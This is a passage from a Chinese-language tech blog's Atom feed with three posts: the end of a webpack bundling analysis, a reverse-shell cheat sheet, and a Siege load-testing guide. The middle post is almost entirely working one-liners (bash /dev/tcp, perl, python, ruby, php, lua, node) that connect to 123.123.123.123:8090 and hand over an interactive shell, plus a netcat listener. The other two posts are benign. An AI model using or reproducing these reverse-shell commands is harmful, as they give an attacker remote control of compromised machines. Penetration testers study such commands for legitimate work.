__webpack_require__.r(__webpack_exports__);        var _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(&quot;./src/templates/utils.js&quot;);        const result = _utils__WEBPACK_IMPORTED_MODULE_0__[&quot;default&quot;].add(1, 2);        console.log(result);      `);    },  &#39;./src/templates/utils.js&#39;:    function(module, __webpack_exports__, __webpack_require__) {      &#39;use strict&#39;;      eval(`        __webpack_require__.r(__webpack_exports__);        __webpack_require__.d(__webpack_exports__, &quot;add&quot;, function() { return add; });        __webpack_require__.d(__webpack_exports__, &quot;num&quot;, function() { return num; });        __webpack_require__.d(__webpack_exports__, &quot;obj&quot;, function() { return obj; });        const add = (x, y) =&gt; x + y;        const num = 10;        const obj = { a: { b: 1 } };        __webpack_exports__[&quot;default&quot;] = ({ add, num, obj });      `);    }}</code></pre><p>代码分析：</p><ol><li><code>__webpack_exports__</code> 即执行前初始化的 <code>module.export = {}</code>，在代码执行时传入，执行后赋以用 <code>export</code> 和 <code>export default</code> 导出的值或对象</li><li><code>__webpack_require__.r</code> 函数定义了 <code>module.exports.__esModule = true</code></li><li><code>__webpack_require__.d</code> 函数即在 <code>module.exports</code> 上定义导出的变量</li><li><code>export default obj</code> 将会转化为 <code>module.exports.default = obj</code></li><li><code>import utils from &#39;./utils&#39;</code> 将会通过 <code>__webpack_require__</code> 导入，根据前面的分析可以得出，模块代码执行的顺序应该是从入口点开始，<code>import</code> 的顺序，如果有嵌套引入，则会根据执行嵌套的顺序依次执行后标记引入。</li><li>和 <code>commonjs</code> 不同，<code>import</code> 导入的变量是值的引用</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Webpack" scheme="https://vincent0700.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>常见的反弹 Shell</title>
    <link href="https://vincent0700.com/2020/04/28/050_Reverse_shell/"/>
    <id>https://vincent0700.com/2020/04/28/050_Reverse_shell/</id>
    <published>2020-04-28T15:00:00.000Z</published>
    <updated>2020-05-05T08:50:12.068Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>假设服务端 <code>IP</code> 假设为 <code>123.123.123.123</code> 开放端口 <code>8090</code> 用于监听。</p><pre><code class="lang-bash">nc -lvvp 8090</code></pre><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre><code>bash -i &gt;&amp; /dev/tcp/123.123.123.123/8090 0&gt;&amp;1</code></pre><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre><code class="lang-bash">perl -e &#39;use Socket;$i=&quot;123.123.123.123&quot;;$p=8090;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);};&#39;</code></pre><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre><code class="lang-bash">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;123.123.123.123&quot;,8090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><pre><code class="lang-bash">ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;123.123.123.123&quot;,&quot;8090&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code></pre><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre><code class="lang-bash">php -r &#39;$sock=fsockopen(&quot;123.123.123.123&quot;,8090);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h3><pre><code class="lang-bash">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;123.123.123.123&#39;,&#39;8090&#39;);os.execute(&#39;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre><h3 id="node"><a href="#node" class="headerlink" title="node"></a>node</h3><pre><code class="lang-javascript">(function(){    var net = require(&quot;net&quot;),    cp = require(&quot;child_process&quot;),    sh = cp.spawn(&quot;/bin/sh&quot;, []);    var client = new net.Socket();    client.connect(8090, &quot;123.123.123.123&quot;, function(){        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    });    return &quot;Connected&quot;;})();</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="Linux" scheme="https://vincent0700.com/tags/Linux/"/>
    
      <category term="Security" scheme="https://vincent0700.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>压测工具整理</title>
    <link href="https://vincent0700.com/2020/03/12/049_Pressure_test_tools/"/>
    <id>https://vincent0700.com/2020/03/12/049_Pressure_test_tools/</id>
    <published>2020-03-12T01:00:00.000Z</published>
    <updated>2020-03-12T15:23:16.388Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h2><p><embed src="https://img.shields.io/github/stars/JoeDog/siege?style=social">&nbsp;<embed src="https://img.shields.io/github/downloads/JoeDog/siege/total">&nbsp;<embed src="https://img.shields.io/github/last-commit/JoeDog/siege">&nbsp;</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="lang-bash"># 1. Build from sourcewget http://download.joedog.org/siege/siege-4.0.4.tar.gztar xvf siege-4.0.4.tar.gz./configuremakemake install# 2. Binary for MacOSbrew install siege</code></pre><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><pre><code class="lang-text">-c 200        指定并发数200-r 5          指定测试的次数5-f urls.txt   指定url的文件-i            随机访问 url 列表项-b            请求无需等待 delay=0-t 5          持续测试 5 分钟</code></pre><blockquote><p>注意： <code>-r</code> 和 <code>-t</code> 一般不同时使用</p></blockquote><h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><ul><li>Transactions: 总共测试次数</li><li>Availability: 成功次数百分比</li><li>Elapsed time: 总共耗时多少秒</li><li>Data transferred: 总共数据传输</li><li>Response time: 等到响应耗时</li><li>Transaction rate: 平均每秒处理请求数</li><li>Throughput: 吞吐率</li><li>Concurrency: 最高并发</li><li>Successful transactions: 成功的请求数</li><li>Failed transactions: 失败的请求数</li><li>Longest transaction: 每次传输所花最长时间</li><li>Shortest transaction: 每次传输所花最短时间</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre><code class="lang-bash"># 200个并发对http://www.google.com发送请求100次siege -c 200 -r 100 http://www.google.com# 在urls.txt中列出所有的网址siege -c 200 -r 100 -f urls.txt# 随机选取urls.txt中列出所有的网址siege -c 200 -r 100 -f urls.txt -i# delay=0，更准确的压力测试，而不是功能测试siege -c 200 -r 100 -f urls.txt -i -b# 指定http请求头 文档类型siege -H &quot;Content-Type:application/json&quot;-c 200 -r 100 -f urls.txt -i -b&#39;&#39;&#39; Result:{      &quot;transactions&quot;:             803,  &quot;availability&quot;:             100.00,  &quot;elapsed_time&quot;:             1.53,  &quot;data_transferred&quot;:         10.13,  &quot;response_time&quot;:            0.28,  &quot;transaction_rate&quot;:         524.84,  &quot;throughput&quot;:               6.62,  &quot;concurrency&quot;:              145.41,  &quot;successful_transactions&quot;:  803,  &quot;failed_transactions&quot;:      0,  &quot;longest_transaction&quot;:      0.83,  &quot;shortest_transaction&quot;:     0.07}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincent0700.com/categories/Toolkit/"/>
    
    
      <category term="Test" scheme="https://vincent0700.com/tags/Test/"/>
    
  </entry>
  
</feed>
